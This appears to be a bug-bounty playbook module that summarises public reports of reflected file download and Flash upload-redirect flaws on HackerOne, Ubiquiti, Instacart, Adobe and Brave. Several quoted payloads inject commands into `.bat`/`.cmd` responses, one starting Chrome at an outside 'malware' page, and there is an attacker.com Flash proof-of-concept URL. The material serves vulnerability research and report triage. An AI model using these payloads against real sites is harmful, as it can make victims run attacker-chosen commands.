---
title: "RFD & browser download/upload abuse — the .bat ladder and the Flash upload bug"
type: playbook
category: rfd-browser-download
cwe: "CWE-94 · CWE-601"
source_count: 6
full_bodies_available: 6
corpus: "h1.security.nathan.sx roster (86 title-arm rows), bodies via hackerone.com/reports/<id>.json"
list_accessed: "2026-11-05"
note: "Anchor bodies: FU-51265 (Adobe Flash CVE-2015-0337, $2,000 list, team column literally 'Flash'), FU-50658 (hackerone.com .bat), FU-158505 (Sopas Instacart RFD). Claims trace to bodies read 2026-11-05."
---

# Module 06 — reflected file download & browser download-abuse lanes

## 1. Overview

Six rows, **$2,150/2 paid**. This module collects the lanes that act through the *target's
own domain or browser trust*, not the server's filesystem: the RFD family (Oren Hafif's
BlackHat EU 2014 vector — reflected content served with a command-interpreting extension),
plus the two browser-tangents (182557's download-extension naming; 51265's Flash upload
bug, where "file upload" is the vehicle but the flaw is the redirect-follow). Both money
rows are browser-response rows: $2,000 (list) to the Flash team itself and $150 (list) to
the Ubiquiti community endpoint.

**Case-stock (6 rows / $2,150):**

| Case | Target | Family | Mechanism | Bounty |
|---|---|---|---|---|
| [FU-51265](https://hackerone.com/reports/51265) | Flash (Adobe) | upload-redirect | 307/308 skip + `UPLOAD_COMPLETE_DATA` read | $2,000 (list) |
| [FU-107960](https://hackerone.com/reports/107960) | Ubiquiti | RFD | restapi `callback=\%22\|\|calc\|\|` + `.cmd` | $150 (list) |
| [FU-39658](https://hackerone.com/reports/39658) | HackerOne | RFD | stored trigger text reflected via `triggers/<id>.bat` | - (list) |
| [FU-50658](https://hackerone.com/reports/50658) | HackerOne | RFD | report title → `notifications.bat` | - (list) |
| [FU-158505](https://hackerone.com/reports/158505) | Instacart | RFD | `searches.bat?term="\|\|start chrome…" | - (list) |
| [FU-182557](https://hackerone.com/reports/182557) | Brave Software | download naming | path-derived download extensions (`/.com`) | - (list) |

## 2. Anatomy

### 2.1 The RFD recipe, corpus-verified three ways

**FU-39658** (HackerOne's own program) is the fullest writeup of the vector — it cites the
2014 origin and walks the ladder: create a trigger whose `text` field is
`text" || calc ||` → the trigger's edit URL `hackerone.com/<team_name>/triggers/<numeric_id>/edit`
with `/edit` removed reflects the payload inside JSON → appending `.bat` yields the batch
file, and per the body "if we take this JSON response and paste it in a Command Prompt it
would open up a calculator." The pre-requisite line matters for triage: "To affect a user,
he/she must be in a team with the attacker." — stored-reflection reach limits the blast
radius; the row resolved unpaid.

**FU-50658** (resolved) is the *stored* variant made universal: the attacker *reports a bug
titled* `hackerone"||calc||`, then the notifications page that renders the title is itself
fetched as `https://hackerone.com/notifications.bat` — calculated from the victim's own
account state. (Resolved; the fix note in the body proposes wrapping the render in
`respond_to do |format| … format.json … end` so "requests of non-json formats would return
a 406 Not Acceptable.") The title
itself says what the class delivers: "Reflected File Download attack allows attacker to
'upload' executables to hackerone.com domain".

**FU-107960** ($150 (list)) — the paid one. Ubiquiti's `restapi/vc/authentication/sessions/…`
with `restapi.response_format=json&callback=\%22||calc||` plus a `.cmd`-suffixed URL — the
body's own one-line verdict, byte-true: "The above URL is vulnerable to RFD" — and it
proves the chain both as an embedded-HTML `download` attribute and directly. **FU-158505**
(informative, David Sopas) runs the same shape on
`https://www.instacart.com/api/v2/searches.bat?cart_id=&term="||start chrome davidsopas.com/poc/malware.htm||&page=1&per=100&max_per_row=7&skip_other_warehouses=true&disable_autocorrect=false&source=web&warehouse_id=129&zone_id=12`,
showing the reflected response verbatim — and it does not overclaim: the finish is the
orchestrator page (`http://0xhack.com/instacart_rfd.htm`) that forces the download.

### 2.2 The Flash upload bug (51265)

**FU-51265** ($2,000 (list)) — the module's cross-vault row (Open-Redirect vault keeps
RDIR-51265 as its class-04 chain record; this vault carves the *upload* reading) — team
column literally `Flash`, i.e. Adobe's own program. The CVE-2015-0337 body, byte-true:

> It is possible to bypass Flash Cross Domain policy in Google Chrome to read other
> websites' contents after a user uploads a file to a destination that redirects the user
> to the target website. It is also possible to send a file upload request to a target
> website without checking the cross domain policy by using an open redirect with status
> code of 307 (or 308).

The mechanism list that follows enumerates both flaws (redirect-follow leaking into
`UPLOAD_COMPLETE_DATA`; 307/308 re-upload to the final destination without a policy check)
and the PoC builds on an open redirect —
`http://attacker.com/chromeFileUploadCrossDomain.swf?url=http://0me.me/demo/openredirect/redirect.php?target=https://plus.google.com/u/0/%26status=301`:

> Note: "0me.me" has an open cross domain policy and that's why we did not need to host it
> on "attacker.com".

Treat as the lane's canonical file-upload-meets-browser-redirect row.

### 2.3 The naming tangent (182557)

**FU-182557** (Brave, informative, high) — browser derives download-extension from the URL
path: `http://example.com/` downloads as `.com`, and the body's reasoning, byte-true:
"because `.com` files are executable files which may can do what `.exe` can do" — with the
extra `.com.py`-as-Python wrinkle (so "any website can make his favorable extension in the
domain path and when the user downloads it it will be downloaded by the extension"). The
browser turns non-downloadable links into executable downloads — recorded to the browser
lane, not the server class.

## 3. Techniques (corpus-derived)

1. **Extension-probing GET**: append `.bat`/`.cmd`/`.sh` to JSON-reflection endpoints and
   Content-Disposition checks — every RFD row's first step (39658 step 6, 107960, 158505).
2. **Stored-rfd**: any user-writable field rendered as JSON on a *stable URL* works; the
   report title (50658) is the funniest demonstration.
3. **Redirect validator**: 307/308 re-sends the body — pair with upload and audit whether
   any client re-posts (51265).
4. **Show the interpreter receipt**: RFD's calculator/chrome-start proof lands *after
   download* — present the chain (page forcing the download).
5. **Don't overclaim**: reflective response + `.bat` without a download-orchestration page
   was resolved unpaid (39658/158505/50658) — whatever gets paid needs the full 107960/51265
   writeup shape (download attribute + swf PoC).

## 4. Kill-gates

- RFD rows must show the *browser serving* the payload — `Content-Disposition`-less
  responses alone do not prove the attack.
- Limit claims to what the browser can prove: RFD proof is a victim-machine command, not
  exfiltration evidence; 158505's report closed informative even with a landing page, and
  39658/50658 resolved without bounty — the paid line (107960) shows both the download
  attribute and the direct fetch, so mirror that shape.
- Do not double-claim through cross-vault lanes: 51265's $2,000 lives in both the
  Open-Redirect (chain origin) and here (upload-vehicle) — say that in writeups.
